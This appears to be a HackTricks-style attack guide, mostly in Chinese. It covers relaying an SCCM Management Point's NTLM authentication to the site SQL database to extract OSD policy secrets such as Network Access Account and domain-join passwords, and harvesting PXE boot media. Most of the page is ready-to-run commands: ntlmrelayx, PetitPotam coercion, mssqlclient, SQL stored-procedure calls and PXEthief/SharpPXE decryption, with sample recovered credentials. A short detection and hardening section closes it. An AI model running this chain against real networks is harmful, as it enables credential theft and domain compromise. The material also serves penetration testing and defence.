# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
通过强制 **System Center Configuration Manager (SCCM) Management Point (MP)** 通过 SMB/RPC 进行身份验证，并将该 NTLM machine account **relaying** 到 **site database (MSSQL)**，即可获得 `smsdbrole_MP` / `smsdbrole_MPUserSvc` 权限。这些角色允许你调用一组 stored procedures，以获取 **Operating System Deployment (OSD)** policy blobs（Network Access Account 凭据、Task-Sequence 变量等）。这些 blobs 经过十六进制编码/加密，但可以使用 **PXEthief** 进行解码和解密，从而得到明文 secrets。<sup>[[2]](#references)</sup>

High-level chain:
1. Discover MP & site DB ↦ 未经身份验证的 HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`。
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`。
3. 使用 **PetitPotam**、PrinterBug、DFSCoerce 等工具强制 MP 进行身份验证。
4. 通过 SOCKS proxy 使用 `mssqlclient.py -windows-auth`，以被 relayed 的 **<DOMAIN>\\<MP-host>$** account 身份连接。
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. 移除 `0xFFFE` BOM，执行 `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`。

无需接触 PXE 或 clients，即可恢复 `OSDJoinAccount/OSDJoinPassword`、`NetworkAccessUsername/Password` 等 secrets。<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
MP ISAPI extension **GetAuth.dll** 暴露了多个无需身份验证的参数（除非 site 仅使用 PKI）：<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | 返回 site signing cert public key，以及 *x86* / *x64* **All Unknown Computers** devices 的 GUID。 |
| `MPLIST` | 列出 site 中的每个 Management-Point。 |
| `SITESIGNCERT` | 返回 Primary-Site signing certificate（无需 LDAP 即可识别 site server）。 |

获取后续 DB queries 中将作为 **clientID** 的 GUID：
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. 将 MP machine account Relay 至 MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
当 coercion 触发时，你应该看到类似以下内容：
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. 通过存储过程识别 OSD 策略
通过 SOCKS proxy 连接（默认端口为 1080）：<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
切换到 **CM_<SiteCode>** DB（使用 3 位站点代码，例如 `CM_001`）。

### 3.1 查找 Unknown-Computer GUID（可选）
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  列出已分配的策略
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
每一行包含 `PolicyAssignmentID`、`Body`（十六进制）、`PolicyID`、`PolicyVersion`。

重点关注以下 policies：
* **NAAConfig** – Network Access Account 凭据
* **TS_Sequence** – Task Sequence 变量（OSDJoinAccount/Password）
* **CollectionSettings** – 可能包含 run-as 账户

### 3.3  获取完整 body
如果已经拥有 `PolicyID` 和 `PolicyVersion`，可以使用以下方式跳过 clientID 要求：
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 重要：在 SSMS 中增加“Maximum Characters Retrieved”（>65535），否则 blob 将被截断。

---

## 4. 解码并解密 blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
恢复的 secrets 示例：
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevant SQL roles & procedures
通过 relay 后，登录名会映射到：<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

这些角色公开了数十个 EXEC 权限，本次攻击中使用的关键权限如下：

| Stored Procedure | Purpose |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | 列出应用于 `clientID` 的 policies。 |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 返回完整的 policy body。 |
| `MP_GetListOfMPsInSiteOSD` | 由 `MPKEYINFORMATIONMEDIA` path 返回。 |

你可以使用以下命令查看完整列表：
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**：向配置为 PXE 的 Distribution Point 发送 PXE boot request。proxyDHCP 响应会泄露 boot paths，例如 `SMSBoot\\x64\\pxe\\variables.dat`（encrypted config）和 `SMSBoot\\x64\\pxe\\boot.bcd`，以及一个可选的 encrypted key blob。<sup>[[4]](#references)</sup>
* **Retrieve boot artifacts via TFTP**：使用返回的 paths 通过 TFTP 下载 `variables.dat`（unauthenticated）。该文件较小（几 KB），包含 encrypted media variables。
* **Decrypt or crack**：
- 如果响应包含 decryption key，将其提供给 **SharpPXE**，即可直接 decrypt `variables.dat`。
- 如果未提供 key（PXE media 由 custom password 保护），SharpPXE 会输出兼容 **Hashcat** 的 `$sccm$aes128$...` hash，用于 offline cracking。恢复 password 后即可 decrypt 该文件。
* **Parse decrypted XML**：plaintext variables 包含 SCCM deployment metadata（**Management Point URL**、**Site Code**、media GUIDs 及其他 identifiers）。SharpPXE 会解析这些内容，并输出一个可直接运行的 **SharpSCCM** command，其中已预填 GUID/PFX/site parameters，便于后续 abuse。
* **Requirements**：只需要能够连接 PXE listener（UDP/4011）和 TFTP；不需要 local admin privileges。

---

## 7. Detection & Hardening
1. **Monitor MP logins** – 任何从非自身 host IP 登录的 MP computer account，≈ relay。<sup>[[1]](#references)</sup>
2. 在 site database 上启用 **Extended Protection for Authentication (EPA)**（`PREVENT-14`）。
3. Disable 未使用的 NTLM，enforce SMB signing，restrict RPC（
与针对 `PetitPotam`/`PrinterBug` 使用的 mitigations 相同）。
4. 使用 IPSec / mutual-TLS 加固 MP ↔ DB communication。
5. **Constrain PXE exposure** – 将 UDP/4011 和 TFTP 限制在受信任的 VLAN，要求 PXE passwords，并对 `SMSBoot\\*\\pxe\\variables.dat` 的 TFTP downloads 触发 alert。<sup>[[4]](#references)</sup>

---

## 另请参阅
* NTLM relay fundamentals：

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation：

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## References
- [1] [我想和你的 Manager 谈谈：利用 Management Point Relays 窃取 Secrets](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
